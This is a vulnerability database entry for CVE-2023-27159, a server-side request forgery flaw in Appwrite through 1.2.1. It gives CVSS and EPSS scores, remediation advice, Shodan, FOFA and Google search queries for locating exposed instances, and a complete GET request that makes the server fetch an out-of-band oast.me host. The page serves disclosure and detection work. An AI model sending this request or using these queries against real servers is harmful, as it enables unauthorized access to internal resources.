---
layout: "post"
cve_id: "CVE-2023-27159"
title: "Appwrite <=1.2.1 - Server-Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-27159.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-27159.yaml"
author: "DhiyaneshDk"
severity: "high"
impact: "This vulnerability can lead to unauthorized access to internal resources, potential data leakage, and further exploitation of the server.
"
remediation: "Upgrade Appwrite to a version higher than 1.2.1 to mitigate the SSRF vulnerability.
"
reference:
  - "https://gist.github.com/b33t1e/43b26c31e895baf7e7aea2dbf9743a9a"
  - "https://notes.sjtu.edu.cn/gMNlpByZSDiwrl9uZyHTKA"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-27159"
  - "http://appwrite.com"
  - "https://github.com/appwrite/appwrite"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2023-27159', 'cwe-id': 'CWE-918', 'epss-score': 0.84688, 'epss-percentile': 0.99301, 'cpe': 'cpe:2.3:a:appwrite:appwrite:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 1, 'vendor': 'appwrite', 'product': 'appwrite', 'shodan-query': ['title:"Sign In - Appwrite"', 'http.title:"sign in - appwrite"', 'http.favicon.hash:-633108100'], 'fofa-query': ['icon_hash=-633108100', 'title="sign in - appwrite"'], 'google-query': 'intitle:"sign in - appwrite"'}"
tags:
  - "cve2023"
  - "cve"
  - "appwrite"
  - "ssrf"
  - "oast"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Appwrite through 1.2.1 is susceptible to server-side request forgery via the component /v1/avatars/favicon. An attacker can potentially access network resources and sensitive information via a crafted GET request, thereby also making it possible to modify data and/or execute unauthorized administrative operations in the context of the affected site.


## ðŸŒ HTTP Request
```nohighlight
GET /v1/avatars/favicon?url=http://d5ir6lple0o26728nvkg7fswbwh5kkfau.oast.me HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

